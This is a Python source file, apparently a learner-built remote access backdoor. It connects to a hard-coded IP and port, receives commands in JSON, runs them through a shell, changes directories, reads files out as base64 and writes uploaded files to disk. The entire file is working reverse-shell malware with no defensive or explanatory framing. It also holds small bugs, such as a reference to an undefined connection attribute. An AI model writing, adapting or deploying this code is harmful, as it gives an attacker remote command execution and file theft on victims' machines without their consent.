import socket
import subprocess
import simplejson
import os
import base64

class Socket:
	
    def __init__(self, ip, port):
		
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		
        self.connection.connect((ip,port))

	
    def command_execution(self, command):
		
        return subprocess.check_output(command, shell=True)

	
    def json_send(self, data):
		
        json_data = simplejson.dumps(data)
		
        self.connection.send(json_data.encode("utf-8"))

	
    def json_receive(self):
		
        json_data = ""
		
        while True:
			
            try:
				
                json_data = json_data + self.connection.recv(1024).decode()
				
                return simplejson.loads(json_data)
			
            except ValueError:
				
                continue

	
    def execute_cd_command(self,directory):
		
        os.chdir(directory)
		
        return "Cd to " + directory

	
    def read_file(self,path):
		
        with open(path,"rb") as file:
			
            return base64.b64encode(file.read())

	
    def save_file(self,path,content):
		
        with open(path,"wb") as file:
			
            file.write(base64.b64decode(content))
			
            return "Download OK"

	
    def start_socket(self):
		
        while True:
			
            command = self.json_receive()
			
            try:
				
                if command[0] == "quit":
					
                    self.connection.close()
					
                    exit()
				
                elif command[0] == "cd" and len(command) > 1:
					
                    command_output = self.execute_cd_command(command[1])
				
                elif command[0] == "download":
					
                    command_output = self.read_file(command[1])
				
                elif command[0] == "upload":
					
                    command_output = self.save_file(command[1],command[2])
				
                else:
					
                    command_output = self.command_execution(command)
			
            except Exception:
				
                command_output = "Error!"
			
            self.json_send(command_output)
		
        self.my_connection.close()

my_socket_object = Socket("192.168.240.131",8080)
my_socket_object.start_socket()